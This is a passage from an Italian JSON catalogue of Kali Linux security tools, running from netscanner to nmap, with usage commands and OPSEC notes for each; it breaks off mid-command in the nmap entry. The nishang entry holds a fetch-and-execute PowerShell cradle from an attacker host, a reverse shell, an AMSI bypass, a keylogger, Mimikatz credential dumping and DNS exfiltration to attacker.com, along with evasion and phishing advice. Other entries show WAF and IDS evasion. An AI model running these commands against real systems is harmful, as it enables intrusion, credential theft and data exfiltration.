    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netscanner</strong> è uno scanner di rete moderno con interfaccia TUI (Text User Interface) costruita con tecnologie Rust moderne. A differenza degli scanner tradizionali a riga di comando, offre una visualizzazione interattiva in tempo reale degli host e servizi scoperti, permettendo di monitorare il progresso della scansione e interagire con i risultati mentre vengono raccolti. Combina discovery ARP per la rete locale, port scanning TCP e identificazione servizi in un'unica interfaccia intuitiva e visivamente accattivante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interfaccia TUI Interattiva:</strong> Utilizza librerie Rust come tui-rs per creare un'interfaccia terminale ricca con pannelli, tabelle scrollabili e aggiornamento in tempo reale. Permette di navigare tra gli host scoperti, espandere dettagli sui servizi e filtrare risultati senza interrompere la scansione.</p><p><strong>ARP Discovery:</strong> Esegue sweep ARP sulla rete locale per identificare rapidamente tutti gli host attivi. Questa tecnica è più veloce e affidabile del ping sweep su reti dove ICMP è filtrato, mostrando anche dispositivi che non rispondono a ping.</p><p><strong>Port Scanning Asincrono:</strong> Implementa scanning TCP connect asincrono per massimizzare la velocità. Supporta scansione di porte singole, range o liste predefinite (top 100, top 1000) con parallelismo configurabile.</p><p><strong>Service Detection:</strong> Identifica i servizi in ascolto sulle porte aperte tramite banner grabbing e fingerprinting basilare, mostrando nome del servizio e versione quando disponibile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Netscanner si avvia da terminale e rileva automaticamente l'interfaccia di rete. Supporta navigazione con tastiera nell'interfaccia TUI.</p><pre><code># Avvia scanner con auto-detect interfaccia\nnetscanner\n\n# Specifica range di rete\nnetscanner -r 192.168.1.0/24\n\n# Usa interfaccia specifica\nnetscanner -i eth0\n\n# Scansiona porte specifiche\nnetscanner -r 10.0.0.0/24 -p 22,80,443,8080\n\n# Top 1000 porte\nnetscanner -r 192.168.1.0/24 --top-ports 1000</code></pre><p>Nell'interfaccia TUI: frecce per navigare, Enter per espandere dettagli host, Tab per cambiare pannello, q per uscire. I risultati possono essere esportati in formato JSON.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Discovery Visuale</strong>, netscanner offre un modo intuitivo per esplorare una rete sconosciuta, ideale durante le fasi iniziali di un assessment quando si vuole una panoramica rapida dell'infrastruttura.</p><p>Nel contesto di <strong>Learning e Training</strong>, l'interfaccia interattiva aiuta a comprendere i concetti di networking mostrando in tempo reale come gli host rispondono e quali servizi espongono.</p><p>Per <strong>Troubleshooting di Rete</strong>, permette agli amministratori di verificare rapidamente quali dispositivi sono attivi e quali servizi espongono senza dover interpretare output testuali complessi.</p><p>Durante <strong>CTF e Lab</strong>, la velocità e l'immediatezza visiva lo rendono perfetto per ambienti di pratica dove si vuole un feedback istantaneo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Netscanner genera traffico di rete attivo facilmente identificabile. L'ARP sweep è visibile a tool di monitoraggio come arpwatch. Il port scanning produce connessioni TCP che vengono loggate da firewall e IDS.</p><p><strong>Impatto:</strong> Lo scanning asincrono può generare un burst di traffico significativo. Su reti con rate limiting o IPS aggressivi può causare blocchi temporanei dell'IP sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare in ambienti autorizzati e di laboratorio. Ridurre il parallelismo con le opzioni appropriate se si vuole un profilo più basso. Non adatto per operazioni stealth su reti monitorate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "netsed",
    "name": "netsed",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsed/",
    "desc": "Proxy per modificare traffico di rete on-the-fly con regole di sostituzione pattern.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netsed è un proxy di rete leggero progettato per modificare il contenuto dei pacchetti TCP e UDP in transito in tempo reale. Funziona come un man-in-the-middle a livello applicativo, applicando regole di sostituzione pattern ai dati che transitano attraverso di esso. È particolarmente utile per testare la robustezza delle applicazioni contro manipolazione dei dati in transito, per bypassare controlli lato client e per modificare risposte server. Netsed opera in modo trasparente, richiedendo solo la configurazione di regole di sostituzione espresse come pattern sed-like. La sua semplicità lo rende ideale per scenari dove tool più complessi come mitmproxy sarebbero eccessivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Sostituzione pattern in tempo reale:</strong> Netsed applica regole di sostituzione definite dall'utente a ogni pacchetto che transita attraverso il proxy. Le regole seguono una sintassi simile a sed: s/pattern/replacement dove pattern e replacement possono contenere caratteri esadecimali. Questo permette di modificare sia contenuto testuale che binario nei flussi di rete.</p><p><strong>Supporto TCP e UDP:</strong> A differenza di molti proxy che gestiscono solo TCP, netsed supporta nativamente anche il protocollo UDP. Questo lo rende utilizzabile per manipolare protocolli come DNS, SNMP e altri servizi basati su datagrammi. La gestione UDP mantiene le stesse capacità di sostituzione pattern disponibili per TCP.</p><p><strong>Operazione trasparente:</strong> Netsed può essere inserito nel percorso di rete tramite iptables REDIRECT o configurazione proxy esplicita. Non richiede configurazione complessa e inizia a modificare il traffico immediatamente dopo l'avvio. Il logging dettagliato mostra ogni sostituzione effettuata per verificare il corretto funzionamento delle regole.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Netsed richiede la specifica del protocollo, porta locale, host remoto, porta remota e una o più regole di sostituzione.</p><pre><code># Sostituzione testo in traffico HTTP\nnetsed tcp 8080 target.com 80 s/Server: Apache/Server: nginx\n\n# Modifica risposta con pattern esadecimali\nnetsed tcp 4443 10.0.0.5 443 s/%00%01%02/%ff%fe%fd\n\n# Redirect traffico con iptables\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\nnetsed tcp 8080 original-server.com 80 s/Denied/Allowed\n\n# Manipolazione DNS via UDP\nnetsed udp 5353 8.8.8.8 53 s/evil.com/legit.com\n\n# Multiple regole di sostituzione\nnetsed tcp 8080 target.com 80 s/false/true s/denied/granted</code></pre><p>Le regole vengono applicate in ordine sequenziale su ogni pacchetto. Il flag di conteggio opzionale limita il numero di sostituzioni per regola.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Netsed viene utilizzato frequentemente durante test di applicazioni web per verificare se i controlli di validazione sono implementati solo lato client. Modificando le risposte del server (ad esempio cambiando \"false\" in \"true\" nei JSON di risposta), il tester può verificare se l'applicazione client accetta dati manipolati. In scenari di testing IoT, netsed permette di intercettare e modificare comunicazioni tra dispositivi e server cloud, utile per testare la resilienza dei protocolli proprietari. Durante assessment di applicazioni thick-client, netsed può modificare i dati scambiati tra client e server per testare injection, bypass di autorizzazione e manipolazione di parametri critici come prezzi, quantità o ruoli utente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'interposizione di netsed nel percorso di rete richiede tecniche di redirezione (ARP spoofing, iptables) che possono essere rilevate da sistemi di monitoraggio. Le modifiche ai pacchetti possono causare inconsistenze nei checksum applicativi o nelle firme digitali dei dati.</p><p><strong>Impatto operativo:</strong> La manipolazione del traffico in tempo reale può causare corruzione dei dati se le regole di sostituzione non sono precise. Applicazioni che utilizzano integrità crittografica (HMAC, firme) rileveranno le modifiche e rifiuteranno i dati. Il proxy introduce latenza aggiuntiva che potrebbe causare timeout.</p><p><strong>Mitigazioni:</strong> Testare le regole di sostituzione su traffico catturato prima di applicarle in tempo reale. Limitare l'ambito delle regole per evitare sostituzioni non intenzionali. Monitorare i log di netsed per verificare che le sostituzioni avvengano correttamente. Utilizzare in ambienti di test controllati prima di applicare su target reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "netsniff-ng",
    "name": "netsniff-ng",
    "version": "0.6.9",
    "icon": "../app/icons/netsniff-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsniff-ng/",
    "desc": "Toolkit di sniffing ad alte prestazioni con zero-copy per cattura e analisi pacchetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netsniff-ng</strong> è un toolkit di networking ad alte prestazioni per Linux, ottimizzato per cattura e analisi di traffico su reti ad alta velocità (10Gbps e oltre). La caratteristica distintiva è l'utilizzo di tecniche zero-copy che bypassano il normale stack di rete del kernel, permettendo cattura wire-speed senza perdita di pacchetti anche su link saturi. Il progetto include una suite completa di tool: netsniff-ng per cattura, trafgen per traffic generation, flowtop per monitoring connessioni, ifpps per statistiche interfacce, bpfc per compilazione filtri BPF, curvetun per tunnel crittografati, e mausezahn per packet crafting. Essenziale per network forensics, security monitoring, e performance testing su infrastrutture enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-Copy Capture:</strong> Utilizza memory-mapped ring buffer (PACKET_MMAP) per trasferire pacchetti dalla NIC allo userspace senza copie intermedie. Su hardware moderno raggiunge cattura wire-speed su 10Gbps+ con CPU usage minimo.</p><p><strong>Wire-Speed Performance:</strong> Progettato per ambienti dove tcpdump o wireshark perdono pacchetti. Su reti ad alto throughput, netsniff-ng mantiene cattura completa grazie a ottimizzazioni kernel-level e gestione efficiente della memoria.</p><p><strong>Toolkit Completo:</strong> Include trafgen (generatore di traffico programmabile), flowtop (monitor top-like di connessioni), ifpps (statistiche interfacce), bpfc (compilatore filtri BPF avanzato), curvetun (VPN leggera con curve25519), mausezahn (packet crafting).</p><p><strong>PCAP Compatibility:</strong> Output in formato pcap/pcap-ng standard, compatibile con Wireshark, tcpdump, Zeek, e tutti i tool di analisi. Supporta compressione on-the-fly e rotazione automatica dei file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I tool della suite netsniff-ng richiedono privilegi root per raw socket access.</p><pre><code># NETSNIFF-NG - Cattura base\nsudo netsniff-ng -i eth0 -o capture.pcap\n\n# Cattura con filtro BPF\nsudo netsniff-ng -i eth0 -f 'tcp port 80' -o http.pcap\n\n# Cattura con rotazione file (100MB per file)\nsudo netsniff-ng -i eth0 -o /captures/ -F 100MiB\n\n# Verbose con statistiche\nsudo netsniff-ng -i eth0 -o cap.pcap -s --verbose\n\n# TRAFGEN - Generazione traffico da config file\nsudo trafgen -i eth0 -c traffic.cfg -n 1000000\n\n# FLOWTOP - Monitor connessioni in tempo reale\nsudo flowtop -i eth0\n\n# IFPPS - Statistiche interfaccia\nsudo ifpps -d eth0\n\n# BPFC - Compila filtro BPF complesso\nbpfc -f 'tcp and port 443 and host 192.168.1.1'\n\n# CURVETUN - Tunnel crittografato\n# Server:\nsudo curvetun -s -p 4444 -k server.key\n# Client:\nsudo curvetun -c server_ip -p 4444 -k client.key\n\n# Replay PCAP su interfaccia\nsudo netsniff-ng -i eth0 --in capture.pcap -k1000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics Enterprise</strong>, quando si deve catturare traffico su link ad alta velocità senza perdite, netsniff-ng è la scelta standard. Data center, backbone links, e punti di aggregazione dove tcpdump perde pacchetti.</p><p>Durante <strong>Incident Response</strong>, la cattura completa del traffico è critica per ricostruire l'attività dell'attaccante. Netsniff-ng garantisce che nessun pacchetto vada perso durante l'acquisizione delle evidenze.</p><p>Per <strong>Performance Testing</strong>, trafgen può generare traffico ad alto volume per stress testing di firewall, IDS, e infrastruttura di rete. Configurazione flessibile permette di simulare pattern di traffico specifici.</p><p>Nel <strong>Security Monitoring</strong>, flowtop fornisce visibilità real-time sulle connessioni attive, utile per identificare anomalie, connessioni sospette, o data exfiltration in corso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Passiva:</strong> netsniff-ng in modalità cattura è completamente passivo e non genera traffico. Non rilevabile dalla rete. trafgen invece inietta attivamente traffico.</p><p><strong>Promiscuous Mode:</strong> Richiede promiscuous mode sulla NIC per catturare tutto il traffico, non solo quello destinato all'host. Su switch moderni, richiede port mirroring/SPAN per vedere traffico di altri host.</p><p><strong>Storage Requirements:</strong> Cattura wire-speed genera volumi enormi di dati. 10Gbps saturato produce ~1.2GB/s. Pianificare storage adeguato e policy di retention. Considerare filtri BPF per ridurre volume.</p><p><strong>Legal Compliance:</strong> Intercettazione di traffico di rete può avere implicazioni legali. Verificare compliance con normative locali e policy aziendali prima di attivare cattura su reti di produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "nextnet",
    "name": "nextnet",
    "version": "0.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nextnet/",
    "desc": "Tool per identificare subnet raggiungibili da un host tramite pivot point analysis.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nextnet</strong> è uno strumento specializzato per la fase di post-exploitation che identifica tutte le reti raggiungibili da un host compromesso. Analizzando la routing table, le interfacce di rete, le connessioni attive e eseguendo probing selettivo, costruisce una mappa delle subnet a cui l'host ha accesso diretto o indiretto. Questa informazione è fondamentale per pianificare strategie di pivoting e lateral movement efficaci durante operazioni di red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Routing Table Analysis:</strong> Parsing completo della tabella di routing del sistema per identificare tutte le reti configurate, i gateway, e le metriche. Rileva route statiche, dinamiche, e VPN che potrebbero fornire accesso a segmenti di rete altrimenti isolati.</p><p><strong>Interface Enumeration:</strong> Lista tutte le interfacce di rete (fisiche, virtuali, tunnel) con relativi indirizzi IP, subnet mask, e stato. Identifica interfacce multiple che potrebbero indicare accesso a VLAN diverse o reti di management separate.</p><p><strong>Active Connection Analysis:</strong> Esamina le connessioni TCP/UDP attive per inferire reti raggiungibili basandosi sul traffico esistente. Connessioni verso subnet non presenti nella routing table possono indicare tunnel o proxy.</p><p><strong>Subnet Probing:</strong> Esegue test di raggiungibilità verso gateway e host rappresentativi per validare l'effettivo accesso alle reti identificate, distinguendo tra route teoriche e percorsi realmente utilizzabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nextnet viene eseguito sull'host compromesso per mappare le opportunità di pivoting.</p><pre><code># Analisi completa dell'host corrente\nnextnet\n\n# Output dettagliato con informazioni di debug\nnextnet -v\n\n# Analizza routing table da file (per analisi offline)\nnextnet -r routes.txt\n\n# Esclude reti specifiche dall'output\nnextnet --exclude 192.168.1.0/24\n\n# Output in formato JSON per integrazione con altri tool\nnextnet --json > networks.json\n\n# Solo reti private (RFC1918)\nnextnet --private-only</code></pre><p>L'output evidenzia le subnet raggiungibili con informazioni sulla qualità del percorso e suggerimenti per tool di pivoting appropriati (chisel, ligolo, sshuttle).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Pivot Planning</strong>, dopo aver compromesso un host perimetrale o un jump server, nextnet rivela immediatamente quali reti interne sono raggiungibili, permettendo di prioritizzare i target più interessanti (es. subnet server, management network).</p><p>In operazioni di <strong>Red Team</strong>, la mappa delle reti raggiungibili guida la strategia di espansione del foothold. Un host con accesso a multiple VLAN diventa un pivot point di alto valore.</p><p>Per <strong>Network Segmentation Assessment</strong>, verificare da un host compromesso quali reti sono effettivamente isolate e quali invece sono raggiungibili nonostante le policy di sicurezza dichiarate.</p><p>Durante <strong>Incident Response</strong>, i difensori possono usare nextnet per capire l'impatto potenziale di una compromissione e quali segmenti di rete sono a rischio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'analisi delle configurazioni locali (routing table, interfacce) è completamente passiva e non genera traffico. Il modulo di probing attivo invece invia pacchetti ICMP/TCP che possono essere rilevati da IDS e firewall.</p><p><strong>Impatto:</strong> Nessun impatto sul sistema host. Il probing può generare log su firewall e sistemi di monitoraggio nelle reti testate.</p><p><strong>Mitigazioni:</strong> Utilizzare la modalità passiva (--no-probe) in ambienti con monitoraggio aggressivo. Analizzare l'output offline se necessario. I risultati del probing confermano la raggiungibilità ma possono esporre l'attività.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "nikto",
    "name": "nikto",
    "version": "2.5.0",
    "icon": "../app/icons/nikto-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nikto/",
    "desc": "Scanner web classico per vulnerabilità, misconfig server, file sensibili e CGI exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nikto</strong> è uno scanner web classico per vulnerabilità server. Testa migliaia di problemi: file sensibili, versioni software vulnerabili, misconfigurazione, CGI problems, e altro. Aggiornato regolarmente con nuove vulnerabilità. Tool fondamentale per web assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>6700+ Tests:</strong> Ampio database di check.</p><p><strong>Version Detection:</strong> Identifica software e versioni.</p><p><strong>File Discovery:</strong> Trova file sensibili.</p><p><strong>Multiple Formats:</strong> Output HTML, XML, CSV.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con SSL e output multi-formato\nnikto -h https://target.com -ssl -o report.html -Format html,csv,xml\n\n# Scan porte multiple contemporaneamente\nnikto -h target.com -p 80,443,8080,8443\n\n# Tuning granulare per test specifici\n# 1=Files, 2=Misconfig, 3=Info, 4=XSS, 5=Inj, 6=RFI, 7=Cmd, 8=SQLi, 9=DoS\nnikto -h target.com -Tuning 1234567890abc -Cgidirs all\n\n# Evasion WAF completa + randomizzazione\nnikto -h target.com -evasion 1234567 -useragent \"Mozilla/5.0\" -Pause 2\n\n# Autenticazione Basic/Digest\nnikto -h target.com -id admin:password\n\n# Scan con virtual host specifico\nnikto -h 192.168.1.10 -vhost internal.target.com\n\n# Pipeline: nmap -&gt; nikto su porte web trovate\nnmap -sV target.com -p- | grep http | awk '{print $1}' | \\\n  cut -d'/' -f1 | xargs -I{} nikto -h target.com -p {}\n\n# Scan con proxy (Burp) per analisi\nnikto -h target.com -useproxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Assessment</strong>, scan iniziale di vulnerabilità.</p><p>Nel <strong>Compliance</strong>, verifica configurazioni.</p><p><strong>Pentesting</strong> fase di discovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Migliaia di request. User-agent identificabile. Facilmente rilevato da WAF/IDS. Evasion mode può aiutare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "nipper-ng",
    "name": "nipper-ng",
    "version": "0.11.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nipper-ng/",
    "desc": "Analizzatore di configurazione per dispositivi di rete: Cisco, Juniper, firewall.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nipper-ng</strong> (Network Infrastructure Parser) è un tool specializzato nell'analisi di sicurezza di file di configurazione di dispositivi di rete. Supporta un'ampia gamma di vendor: Cisco IOS/PIX/ASA/NX-OS, Juniper JunOS/ScreenOS, CheckPoint, Fortinet FortiGate, SonicWall, HP ProCurve, e molti altri. Analizza le configurazioni identificando: vulnerabilità note, misconfigurazioni di sicurezza, password deboli o in chiaro, ACL troppo permissive, servizi non necessari abilitati, mancanza di hardening, e deviazioni dalle best practice di sicurezza. Genera report dettagliati con severity rating, spiegazioni del rischio, e raccomandazioni di remediation specifiche. Strumento essenziale per audit di sicurezza di infrastrutture di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Vendor Support:</strong> Parser nativi per decine di piattaforme: Cisco (IOS, IOS-XE, NX-OS, PIX, ASA, FWSM), Juniper (JunOS, ScreenOS), CheckPoint, Fortinet, SonicWall, Nortel/Avaya, HP ProCurve, 3Com, e dispositivi generici via parsing configurabile.</p><p><strong>Comprehensive Security Analysis:</strong> Verifica centinaia di check di sicurezza: password strength, encryption settings, AAA configuration, management protocols (SSH vs Telnet), logging, NTP, SNMP communities, routing protocol authentication, ACL analysis, NAT configuration, VPN settings.</p><p><strong>Best Practice Compliance:</strong> Confronta configurazioni con benchmark di sicurezza: CIS Benchmarks, NIST guidelines, vendor hardening guides. Identifica gap rispetto a standard di settore.</p><p><strong>Professional Reporting:</strong> Genera report in formati multipli (HTML, XML, text) con executive summary, findings dettagliati, severity CVSS-style, e raccomandazioni actionable. Ideale per deliverable di audit e compliance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nipper-ng analizza file di configurazione estratti dai dispositivi.</p><pre><code># Analizza router Cisco IOS\nnipper-ng --ios-router running-config.txt\n\n# Firewall Cisco ASA\nnipper-ng --asa asa-config.txt\n\n# Switch Cisco Catalyst\nnipper-ng --ios-switch switch-config.txt\n\n# Juniper JunOS\nnipper-ng --junos juniper-config.txt\n\n# CheckPoint firewall\nnipper-ng --checkpoint objects.C rules.W\n\n# Output HTML per report\nnipper-ng --ios-router config.txt --html > report.html\n\n# Output XML per integrazione\nnipper-ng --ios-router config.txt --xml > report.xml\n\n# Solo security issues (no informational)\nnipper-ng --ios-router config.txt --security\n\n# Con company name per report\nnipper-ng --ios-router config.txt --html --company \"Acme Corp\" > report.html\n\n# Analisi batch di multiple config\nfor cfg in configs/*.txt; do\n  nipper-ng --ios-router \"$cfg\" --html > \"reports/$(basename $cfg .txt).html\"\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Security Audit</strong>, nipper-ng automatizza la review di configurazioni di decine o centinaia di dispositivi di rete. Identifica rapidamente vulnerabilità comuni che richiederebbero ore di analisi manuale.</p><p>Per <strong>Compliance Assessment</strong>, verifica che l'infrastruttura di rete rispetti policy di sicurezza aziendali, standard di settore (PCI-DSS, HIPAA, SOX), e hardening guideline vendor.</p><p>Nel <strong>Penetration Testing</strong>, dopo aver ottenuto accesso a dispositivi di rete, l'analisi delle configurazioni con nipper-ng rivela credenziali, trust relationships, e misconfigurazioni sfruttabili per lateral movement.</p><p>Per <strong>Change Management</strong>, confronto di configurazioni prima e dopo modifiche per verificare che i cambiamenti non introducano nuove vulnerabilità o degradino la security posture.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Offline:</strong> Nipper-ng analizza file di configurazione localmente senza generare traffico di rete. L'analisi può essere eseguita su sistemi air-gapped o in ambienti sicuri.</p><p><strong>Sensitive Data:</strong> I file di configurazione contengono informazioni critiche: password (anche se hashed), SNMP communities, pre-shared keys, topology di rete. Proteggere i file durante e dopo l'analisi. Eliminare in modo sicuro dopo l'uso.</p><p><strong>Report Sensitivity:</strong> I report generati elencano vulnerabilità specifiche dell'infrastruttura. Classificare come confidenziali e limitare distribuzione ai soli stakeholder autorizzati.</p><p><strong>Extraction Legale:</strong> Assicurarsi di avere autorizzazione per estrarre e analizzare le configurazioni dei dispositivi. In contesti di pentest, documentare il permesso di accedere alle config.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "nishang",
    "name": "nishang",
    "version": "0.7.6",
    "icon": "../app/icons/nishang-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nishang/",
    "desc": "Framework PowerShell per pentesting: shell, bypass, privilege escalation e exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nishang è un framework offensivo basato su PowerShell che fornisce script e payload per tutte le fasi del penetration testing su ambienti Windows. Include moduli per generazione di shell, bypass di sicurezza, privilege escalation, exfiltration di dati e persistence. Sviluppato da Nikhil Mittal, Nishang sfrutta le capacità native di PowerShell per operare senza dipendenze esterne, rendendolo ideale per ambienti dove il deployment di tool aggiuntivi è problematico. Gli script sono progettati per essere modulari e possono essere caricati singolarmente in memoria senza toccare il disco. È uno dei framework PowerShell più maturi e completi per operazioni offensive su Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shell e backdoor:</strong> Nishang include diverse implementazioni di reverse shell e bind shell in PowerShell: Invoke-PowerShellTcp, Invoke-PowerShellUdp, Invoke-PowerShellIcmp e Invoke-PoshRatHttp. Ogni variante utilizza un protocollo diverso per la comunicazione, offrendo flessibilità nel bypassare regole firewall. Le shell supportano cifratura e possono essere combinate con tecniche di encoding per evasion.</p><p><strong>Bypass e evasion:</strong> Include script per bypassare AMSI (Antimalware Scan Interface), execution policy restrictions, AppLocker e Constrained Language Mode. Il modulo Invoke-Encode permette di offuscare payload PowerShell in formati base64, hex e compressi. Questi moduli sono fondamentali per operare in ambienti con difese PowerShell attive come Script Block Logging e Module Logging.</p><p><strong>Exfiltration multicanale:</strong> Nishang supporta exfiltration di dati attraverso canali multipli: DNS (Do-Exfiltration-Dns), HTTP, ICMP, e persino tramite servizi cloud. I moduli di exfiltration frammentano automaticamente i dati per rispettare i limiti del protocollo di trasporto. Include anche keylogger, screenshot capture e clipboard monitor per raccolta dati dal target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Gli script Nishang vengono importati in una sessione PowerShell e invocati come cmdlet standard.</p><pre><code># Reverse shell TCP\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-PowerShellTcp.ps1')\nInvoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444\n\n# Bypass AMSI\nInvoke-AmsiBypass -Verbose\n\n# Keylogger con exfiltration\nInvoke-Keylogger -LogPath C:\\temp\\keys.txt -MagicString stoplog\n\n# Dump credenziali\nInvoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'\n\n# Exfiltration via DNS\nDo-Exfiltration -DataToExfiltrate (Get-Content secret.txt) -ExfilOption DNS -DomainName attacker.com\n\n# Generazione payload encoded\nInvoke-Encode -DataToEncode 'IEX(reverse-shell-code)' -OutCommand</code></pre><p>Per evitare il download da disco, i moduli possono essere caricati direttamente in memoria tramite IEX e DownloadString o tramite cradle personalizzati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nishang è utilizzato in operazioni di red team dove l'accesso iniziale è stato ottenuto su un sistema Windows e si necessita di stabilire persistence e comunicazione C2 utilizzando solo strumenti nativi. Le reverse shell PowerShell di Nishang sono ideali per ambienti dove il deployment di agent C2 compilati verrebbe bloccato da soluzioni antivirus. In fase di post-exploitation, i moduli di credential dumping e keylogging permettono di raccogliere credenziali senza caricare eseguibili sospetti sul disco. L'exfiltration via DNS è particolarmente utile in ambienti con firewall restrittivi che permettono solo traffico DNS verso l'esterno. Nishang è anche utilizzato per generare payload offuscati da incorporare in documenti Office o HTA per campagne di phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli script Nishang sono ben noti alle soluzioni di sicurezza e le loro firme sono presenti in AMSI, Windows Defender e la maggior parte degli antivirus. PowerShell Script Block Logging (Event ID 4104) registra il contenuto completo degli script eseguiti. Module Logging cattura i nomi dei cmdlet invocati.</p><p><strong>Impatto operativo:</strong> L'uso di PowerShell per operazioni offensive è fortemente monitorato negli ambienti enterprise moderni. Constrained Language Mode e AppLocker possono bloccare l'esecuzione di script non firmati. Le connessioni di rete generate dalle shell sono visibili nei log di Windows Firewall.</p><p><strong>Mitigazioni:</strong> Offuscare gli script prima dell'uso con Invoke-Encode o tool esterni come Invoke-Obfuscation. Utilizzare AMSI bypass aggiornati prima di caricare i moduli. Preferire l'esecuzione in-memory tramite cradle per evitare artefatti su disco. Considerare l'uso di PowerShell runspace invece di powershell.exe per evitare la creazione del processo PowerShell monitorato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "nmap-kali",
    "name": "nmap",
    "version": "7.95",
    "icon": "../app/icons/nmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nmap/",
    "desc": "Lo scanner di rete più usato al mondo: discovery, port scan, OS/service detection, NSE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nmap</strong> (Network Mapper) è LO scanner di rete più utilizzato al mondo. Esegue host discovery, port scanning, OS detection, service/version detection, e vulnerability scanning via NSE (Nmap Scripting Engine). Strumento fondamentale per ogni security professional.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Port Scanning:</strong> TCP SYN/Connect, UDP, etc.</p><p><strong>OS Detection:</strong> Fingerprinting del sistema operativo.</p><p><strong>Service Detection:</strong> Versioni software.</p><p><strong>NSE:</strong> 600+ script per vulnerability detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\nnmap target.com                     # Top 1000 porte\nnmap -sS -sV -p- target.com         # Full TCP con versioni\nnmap -sU --top-ports 100 target     # UDP top 100\n\n# === AGGRESSIVE RECON ===\nnmap -A -T4 -p- target.com          # OS, version, scripts, traceroute\nnmap -sC -sV -O target.com          # Default scripts + version + OS\n\n# === STEALTH / EVASION ===\n# Frammentazione pacchetti\nnmap -f -sS target.com\n# Decoy (nasconde tra IP fake)\nnmap -D RND:10 target.com\n# Source port spoofing (simula DNS/HTTP)\nnmap --source-port 53 -sS target.com\nnmap --source-port 80 -sS target.com\n# Slow scan (evita IDS threshold)\nnmap -T1 -sS --max-rate 10 target.com\n# Idle scan (truly anonymous via zombie)\nnmap -sI zombie_ip 